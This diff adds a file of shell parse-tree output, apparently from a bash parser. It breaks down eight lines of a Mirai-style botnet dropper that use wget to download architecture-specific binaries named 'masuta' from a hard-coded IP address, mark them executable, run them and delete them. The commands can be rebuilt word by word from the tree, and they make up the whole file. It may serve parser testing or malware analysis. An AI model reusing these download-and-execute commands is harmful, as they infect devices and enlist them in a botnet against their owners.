@@ -1,0 +1,392 @@
+ListNode(lineno=2, pos=(12, 201), parts=[
+  CommandNode(lineno=2, pos=(12, 19), parts=[
+    WordNode(lineno=2, pos=(12, 14), word='cd'),
+    WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  CommandNode(lineno=2, pos=(23, 34), parts=[
+    WordNode(lineno=2, pos=(23, 25), word='cd'),
+    WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  CommandNode(lineno=2, pos=(38, 45), parts=[
+    WordNode(lineno=2, pos=(38, 40), word='cd'),
+    WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  CommandNode(lineno=2, pos=(49, 57), parts=[
+    WordNode(lineno=2, pos=(49, 51), word='cd'),
+    WordNode(lineno=2, pos=(52, 57), word='/root'),
+  ]),
+  OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  CommandNode(lineno=2, pos=(61, 65), parts=[
+    WordNode(lineno=2, pos=(61, 63), word='cd'),
+    WordNode(lineno=2, pos=(64, 65), word='/'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  CommandNode(lineno=2, pos=(67, 129), parts=[
+    WordNode(lineno=2, pos=(67, 71), word='wget'),
+    WordNode(lineno=2, pos=(72, 109), word='http://80.211.175.22/bins/masuta.mips'),
+    WordNode(lineno=2, pos=(110, 112), word='-O'),
+    WordNode(lineno=2, pos=(113, 129), word='sunlessmiraimips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(129, 130)),
+  CommandNode(lineno=2, pos=(131, 156), parts=[
+    WordNode(lineno=2, pos=(131, 136), word='chmod'),
+    WordNode(lineno=2, pos=(137, 139), word='+x'),
+    WordNode(lineno=2, pos=(140, 156), word='sunlessmiraimips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(156, 157)),
+  CommandNode(lineno=2, pos=(158, 176), parts=[
+    WordNode(lineno=2, pos=(158, 176), word='./sunlessmiraimips'),
+  ]),
+  OperatorNode(lineno=2, op=';', pos=(176, 177)),
+  CommandNode(lineno=2, pos=(178, 201), parts=[
+    WordNode(lineno=2, pos=(178, 180), word='rm'),
+    WordNode(lineno=2, pos=(181, 184), word='-rf'),
+    WordNode(lineno=2, pos=(185, 201), word='sunlessmiraimips'),
+  ]),
+])
+ListNode(lineno=3, pos=(202, 399), parts=[
+  CommandNode(lineno=3, pos=(202, 209), parts=[
+    WordNode(lineno=3, pos=(202, 204), word='cd'),
+    WordNode(lineno=3, pos=(205, 209), word='/tmp'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(210, 212)),
+  CommandNode(lineno=3, pos=(213, 224), parts=[
+    WordNode(lineno=3, pos=(213, 215), word='cd'),
+    WordNode(lineno=3, pos=(216, 224), word='/var/run'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(225, 227)),
+  CommandNode(lineno=3, pos=(228, 235), parts=[
+    WordNode(lineno=3, pos=(228, 230), word='cd'),
+    WordNode(lineno=3, pos=(231, 235), word='/mnt'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(236, 238)),
+  CommandNode(lineno=3, pos=(239, 247), parts=[
+    WordNode(lineno=3, pos=(239, 241), word='cd'),
+    WordNode(lineno=3, pos=(242, 247), word='/root'),
+  ]),
+  OperatorNode(lineno=3, op='||', pos=(248, 250)),
+  CommandNode(lineno=3, pos=(251, 255), parts=[
+    WordNode(lineno=3, pos=(251, 253), word='cd'),
+    WordNode(lineno=3, pos=(254, 255), word='/'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(255, 256)),
+  CommandNode(lineno=3, pos=(257, 321), parts=[
+    WordNode(lineno=3, pos=(257, 261), word='wget'),
+    WordNode(lineno=3, pos=(262, 299), word='http://80.211.175.22/bins/masuta.mpsl'),
+    WordNode(lineno=3, pos=(300, 302), word='-O'),
+    WordNode(lineno=3, pos=(303, 321), word='sunlessmiraimipsel'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(321, 322)),
+  CommandNode(lineno=3, pos=(323, 350), parts=[
+    WordNode(lineno=3, pos=(323, 328), word='chmod'),
+    WordNode(lineno=3, pos=(329, 331), word='+x'),
+    WordNode(lineno=3, pos=(332, 350), word='sunlessmiraimipsel'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(350, 351)),
+  CommandNode(lineno=3, pos=(352, 372), parts=[
+    WordNode(lineno=3, pos=(352, 372), word='./sunlessmiraimipsel'),
+  ]),
+  OperatorNode(lineno=3, op=';', pos=(372, 373)),
+  CommandNode(lineno=3, pos=(374, 399), parts=[
+    WordNode(lineno=3, pos=(374, 376), word='rm'),
+    WordNode(lineno=3, pos=(377, 380), word='-rf'),
+    WordNode(lineno=3, pos=(381, 399), word='sunlessmiraimipsel'),
+  ]),
+])
+ListNode(lineno=4, pos=(400, 584), parts=[
+  CommandNode(lineno=4, pos=(400, 407), parts=[
+    WordNode(lineno=4, pos=(400, 402), word='cd'),
+    WordNode(lineno=4, pos=(403, 407), word='/tmp'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(408, 410)),
+  CommandNode(lineno=4, pos=(411, 422), parts=[
+    WordNode(lineno=4, pos=(411, 413), word='cd'),
+    WordNode(lineno=4, pos=(414, 422), word='/var/run'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(423, 425)),
+  CommandNode(lineno=4, pos=(426, 433), parts=[
+    WordNode(lineno=4, pos=(426, 428), word='cd'),
+    WordNode(lineno=4, pos=(429, 433), word='/mnt'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(434, 436)),
+  CommandNode(lineno=4, pos=(437, 445), parts=[
+    WordNode(lineno=4, pos=(437, 439), word='cd'),
+    WordNode(lineno=4, pos=(440, 445), word='/root'),
+  ]),
+  OperatorNode(lineno=4, op='||', pos=(446, 448)),
+  CommandNode(lineno=4, pos=(449, 453), parts=[
+    WordNode(lineno=4, pos=(449, 451), word='cd'),
+    WordNode(lineno=4, pos=(452, 453), word='/'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(453, 454)),
+  CommandNode(lineno=4, pos=(455, 515), parts=[
+    WordNode(lineno=4, pos=(455, 459), word='wget'),
+    WordNode(lineno=4, pos=(460, 496), word='http://80.211.175.22/bins/masuta.sh4'),
+    WordNode(lineno=4, pos=(497, 499), word='-O'),
+    WordNode(lineno=4, pos=(500, 515), word='sunlessmiraish4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(515, 516)),
+  CommandNode(lineno=4, pos=(517, 541), parts=[
+    WordNode(lineno=4, pos=(517, 522), word='chmod'),
+    WordNode(lineno=4, pos=(523, 525), word='+x'),
+    WordNode(lineno=4, pos=(526, 541), word='sunlessmiraish4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(541, 542)),
+  CommandNode(lineno=4, pos=(543, 560), parts=[
+    WordNode(lineno=4, pos=(543, 560), word='./sunlessmiraish4'),
+  ]),
+  OperatorNode(lineno=4, op=';', pos=(560, 561)),
+  CommandNode(lineno=4, pos=(562, 584), parts=[
+    WordNode(lineno=4, pos=(562, 564), word='rm'),
+    WordNode(lineno=4, pos=(565, 568), word='-rf'),
+    WordNode(lineno=4, pos=(569, 584), word='sunlessmiraish4'),
+  ]),
+])
+ListNode(lineno=5, pos=(585, 769), parts=[
+  CommandNode(lineno=5, pos=(585, 592), parts=[
+    WordNode(lineno=5, pos=(585, 587), word='cd'),
+    WordNode(lineno=5, pos=(588, 592), word='/tmp'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(593, 595)),
+  CommandNode(lineno=5, pos=(596, 607), parts=[
+    WordNode(lineno=5, pos=(596, 598), word='cd'),
+    WordNode(lineno=5, pos=(599, 607), word='/var/run'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(608, 610)),
+  CommandNode(lineno=5, pos=(611, 618), parts=[
+    WordNode(lineno=5, pos=(611, 613), word='cd'),
+    WordNode(lineno=5, pos=(614, 618), word='/mnt'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(619, 621)),
+  CommandNode(lineno=5, pos=(622, 630), parts=[
+    WordNode(lineno=5, pos=(622, 624), word='cd'),
+    WordNode(lineno=5, pos=(625, 630), word='/root'),
+  ]),
+  OperatorNode(lineno=5, op='||', pos=(631, 633)),
+  CommandNode(lineno=5, pos=(634, 638), parts=[
+    WordNode(lineno=5, pos=(634, 636), word='cd'),
+    WordNode(lineno=5, pos=(637, 638), word='/'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(638, 639)),
+  CommandNode(lineno=5, pos=(640, 700), parts=[
+    WordNode(lineno=5, pos=(640, 644), word='wget'),
+    WordNode(lineno=5, pos=(645, 681), word='http://80.211.175.22/bins/masuta.x86'),
+    WordNode(lineno=5, pos=(682, 684), word='-O'),
+    WordNode(lineno=5, pos=(685, 700), word='sunlessmiraix86'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(700, 701)),
+  CommandNode(lineno=5, pos=(702, 726), parts=[
+    WordNode(lineno=5, pos=(702, 707), word='chmod'),
+    WordNode(lineno=5, pos=(708, 710), word='+x'),
+    WordNode(lineno=5, pos=(711, 726), word='sunlessmiraix86'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(726, 727)),
+  CommandNode(lineno=5, pos=(728, 745), parts=[
+    WordNode(lineno=5, pos=(728, 745), word='./sunlessmiraix86'),
+  ]),
+  OperatorNode(lineno=5, op=';', pos=(745, 746)),
+  CommandNode(lineno=5, pos=(747, 769), parts=[
+    WordNode(lineno=5, pos=(747, 749), word='rm'),
+    WordNode(lineno=5, pos=(750, 753), word='-rf'),
+    WordNode(lineno=5, pos=(754, 769), word='sunlessmiraix86'),
+  ]),
+])
+ListNode(lineno=6, pos=(770, 954), parts=[
+  CommandNode(lineno=6, pos=(770, 777), parts=[
+    WordNode(lineno=6, pos=(770, 772), word='cd'),
+    WordNode(lineno=6, pos=(773, 777), word='/tmp'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(778, 780)),
+  CommandNode(lineno=6, pos=(781, 792), parts=[
+    WordNode(lineno=6, pos=(781, 783), word='cd'),
+    WordNode(lineno=6, pos=(784, 792), word='/var/run'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(793, 795)),
+  CommandNode(lineno=6, pos=(796, 803), parts=[
+    WordNode(lineno=6, pos=(796, 798), word='cd'),
+    WordNode(lineno=6, pos=(799, 803), word='/mnt'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(804, 806)),
+  CommandNode(lineno=6, pos=(807, 815), parts=[
+    WordNode(lineno=6, pos=(807, 809), word='cd'),
+    WordNode(lineno=6, pos=(810, 815), word='/root'),
+  ]),
+  OperatorNode(lineno=6, op='||', pos=(816, 818)),
+  CommandNode(lineno=6, pos=(819, 823), parts=[
+    WordNode(lineno=6, pos=(819, 821), word='cd'),
+    WordNode(lineno=6, pos=(822, 823), word='/'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(823, 824)),
+  CommandNode(lineno=6, pos=(825, 885), parts=[
+    WordNode(lineno=6, pos=(825, 829), word='wget'),
+    WordNode(lineno=6, pos=(830, 866), word='http://80.211.175.22/bins/masuta.ppc'),
+    WordNode(lineno=6, pos=(867, 869), word='-O'),
+    WordNode(lineno=6, pos=(870, 885), word='sunlessmiraippc'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(885, 886)),
+  CommandNode(lineno=6, pos=(887, 911), parts=[
+    WordNode(lineno=6, pos=(887, 892), word='chmod'),
+    WordNode(lineno=6, pos=(893, 895), word='+x'),
+    WordNode(lineno=6, pos=(896, 911), word='sunlessmiraippc'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(911, 912)),
+  CommandNode(lineno=6, pos=(913, 930), parts=[
+    WordNode(lineno=6, pos=(913, 930), word='./sunlessmiraippc'),
+  ]),
+  OperatorNode(lineno=6, op=';', pos=(930, 931)),
+  CommandNode(lineno=6, pos=(932, 954), parts=[
+    WordNode(lineno=6, pos=(932, 934), word='rm'),
+    WordNode(lineno=6, pos=(935, 938), word='-rf'),
+    WordNode(lineno=6, pos=(939, 954), word='sunlessmiraippc'),
+  ]),
+])
+ListNode(lineno=7, pos=(955, 1144), parts=[
+  CommandNode(lineno=7, pos=(955, 962), parts=[
+    WordNode(lineno=7, pos=(955, 957), word='cd'),
+    WordNode(lineno=7, pos=(958, 962), word='/tmp'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(963, 965)),
+  CommandNode(lineno=7, pos=(966, 977), parts=[
+    WordNode(lineno=7, pos=(966, 968), word='cd'),
+    WordNode(lineno=7, pos=(969, 977), word='/var/run'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(978, 980)),
+  CommandNode(lineno=7, pos=(981, 988), parts=[
+    WordNode(lineno=7, pos=(981, 983), word='cd'),
+    WordNode(lineno=7, pos=(984, 988), word='/mnt'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(989, 991)),
+  CommandNode(lineno=7, pos=(992, 1000), parts=[
+    WordNode(lineno=7, pos=(992, 994), word='cd'),
+    WordNode(lineno=7, pos=(995, 1000), word='/root'),
+  ]),
+  OperatorNode(lineno=7, op='||', pos=(1001, 1003)),
+  CommandNode(lineno=7, pos=(1004, 1008), parts=[
+    WordNode(lineno=7, pos=(1004, 1006), word='cd'),
+    WordNode(lineno=7, pos=(1007, 1008), word='/'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1008, 1009)),
+  CommandNode(lineno=7, pos=(1010, 1072), parts=[
+    WordNode(lineno=7, pos=(1010, 1014), word='wget'),
+    WordNode(lineno=7, pos=(1015, 1052), word='http://80.211.175.22/bins/masuta.arm7'),
+    WordNode(lineno=7, pos=(1053, 1055), word='-O'),
+    WordNode(lineno=7, pos=(1056, 1072), word='sunlessmiraiarm7'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1072, 1073)),
+  CommandNode(lineno=7, pos=(1074, 1099), parts=[
+    WordNode(lineno=7, pos=(1074, 1079), word='chmod'),
+    WordNode(lineno=7, pos=(1080, 1082), word='+x'),
+    WordNode(lineno=7, pos=(1083, 1099), word='sunlessmiraiarm7'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1099, 1100)),
+  CommandNode(lineno=7, pos=(1101, 1119), parts=[
+    WordNode(lineno=7, pos=(1101, 1119), word='./sunlessmiraiarm7'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(1119, 1120)),
+  CommandNode(lineno=7, pos=(1121, 1144), parts=[
+    WordNode(lineno=7, pos=(1121, 1123), word='rm'),
+    WordNode(lineno=7, pos=(1124, 1127), word='-rf'),
+    WordNode(lineno=7, pos=(1128, 1144), word='sunlessmiraiarm7'),
+  ]),
+])
+ListNode(lineno=8, pos=(1145, 1329), parts=[
+  CommandNode(lineno=8, pos=(1145, 1152), parts=[
+    WordNode(lineno=8, pos=(1145, 1147), word='cd'),
+    WordNode(lineno=8, pos=(1148, 1152), word='/tmp'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1153, 1155)),
+  CommandNode(lineno=8, pos=(1156, 1167), parts=[
+    WordNode(lineno=8, pos=(1156, 1158), word='cd'),
+    WordNode(lineno=8, pos=(1159, 1167), word='/var/run'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1168, 1170)),
+  CommandNode(lineno=8, pos=(1171, 1178), parts=[
+    WordNode(lineno=8, pos=(1171, 1173), word='cd'),
+    WordNode(lineno=8, pos=(1174, 1178), word='/mnt'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1179, 1181)),
+  CommandNode(lineno=8, pos=(1182, 1190), parts=[
+    WordNode(lineno=8, pos=(1182, 1184), word='cd'),
+    WordNode(lineno=8, pos=(1185, 1190), word='/root'),
+  ]),
+  OperatorNode(lineno=8, op='||', pos=(1191, 1193)),
+  CommandNode(lineno=8, pos=(1194, 1198), parts=[
+    WordNode(lineno=8, pos=(1194, 1196), word='cd'),
+    WordNode(lineno=8, pos=(1197, 1198), word='/'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1198, 1199)),
+  CommandNode(lineno=8, pos=(1200, 1260), parts=[
+    WordNode(lineno=8, pos=(1200, 1204), word='wget'),
+    WordNode(lineno=8, pos=(1205, 1241), word='http://80.211.175.22/bins/masuta.arm'),
+    WordNode(lineno=8, pos=(1242, 1244), word='-O'),
+    WordNode(lineno=8, pos=(1245, 1260), word='sunlessmiraiarm'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1260, 1261)),
+  CommandNode(lineno=8, pos=(1262, 1286), parts=[
+    WordNode(lineno=8, pos=(1262, 1267), word='chmod'),
+    WordNode(lineno=8, pos=(1268, 1270), word='+x'),
+    WordNode(lineno=8, pos=(1271, 1286), word='sunlessmiraiarm'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1286, 1287)),
+  CommandNode(lineno=8, pos=(1288, 1305), parts=[
+    WordNode(lineno=8, pos=(1288, 1305), word='./sunlessmiraiarm'),
+  ]),
+  OperatorNode(lineno=8, op=';', pos=(1305, 1306)),
+  CommandNode(lineno=8, pos=(1307, 1329), parts=[
+    WordNode(lineno=8, pos=(1307, 1309), word='rm'),
+    WordNode(lineno=8, pos=(1310, 1313), word='-rf'),
+    WordNode(lineno=8, pos=(1314, 1329), word='sunlessmiraiarm'),
+  ]),
+])
+ListNode(lineno=9, pos=(1330, 1514), parts=[
+  CommandNode(lineno=9, pos=(1330, 1337), parts=[
+    WordNode(lineno=9, pos=(1330, 1332), word='cd'),
+    WordNode(lineno=9, pos=(1333, 1337), word='/tmp'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1338, 1340)),
+  CommandNode(lineno=9, pos=(1341, 1352), parts=[
+    WordNode(lineno=9, pos=(1341, 1343), word='cd'),
+    WordNode(lineno=9, pos=(1344, 1352), word='/var/run'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1353, 1355)),
+  CommandNode(lineno=9, pos=(1356, 1363), parts=[
+    WordNode(lineno=9, pos=(1356, 1358), word='cd'),
+    WordNode(lineno=9, pos=(1359, 1363), word='/mnt'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1364, 1366)),
+  CommandNode(lineno=9, pos=(1367, 1375), parts=[
+    WordNode(lineno=9, pos=(1367, 1369), word='cd'),
+    WordNode(lineno=9, pos=(1370, 1375), word='/root'),
+  ]),
+  OperatorNode(lineno=9, op='||', pos=(1376, 1378)),
+  CommandNode(lineno=9, pos=(1379, 1383), parts=[
+    WordNode(lineno=9, pos=(1379, 1381), word='cd'),
+    WordNode(lineno=9, pos=(1382, 1383), word='/'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1383, 1384)),
+  CommandNode(lineno=9, pos=(1385, 1445), parts=[
+    WordNode(lineno=9, pos=(1385, 1389), word='wget'),
+    WordNode(lineno=9, pos=(1390, 1426), word='http://80.211.175.22/bins/masuta.sh4'),
+    WordNode(lineno=9, pos=(1427, 1429), word='-O'),
+    WordNode(lineno=9, pos=(1430, 1445), word='sunlessmiraish4'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1445, 1446)),
+  CommandNode(lineno=9, pos=(1447, 1471), parts=[
+    WordNode(lineno=9, pos=(1447, 1452), word='chmod'),
+    WordNode(lineno=9, pos=(1453, 1455), word='+x'),
+    WordNode(lineno=9, pos=(1456, 1471), word='sunlessmiraish4'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1471, 1472)),
+  CommandNode(lineno=9, pos=(1473, 1490), parts=[
+    WordNode(lineno=9, pos=(1473, 1490), word='./sunlessmiraish4'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(1490, 1491)),
+  CommandNode(lineno=9, pos=(1492, 1514), parts=[
+    WordNode(lineno=9, pos=(1492, 1494), word='rm'),
+    WordNode(lineno=9, pos=(1495, 1498), word='-rf'),
+    WordNode(lineno=9, pos=(1499, 1514), word='sunlessmiraish4'),
+  ]),
+])
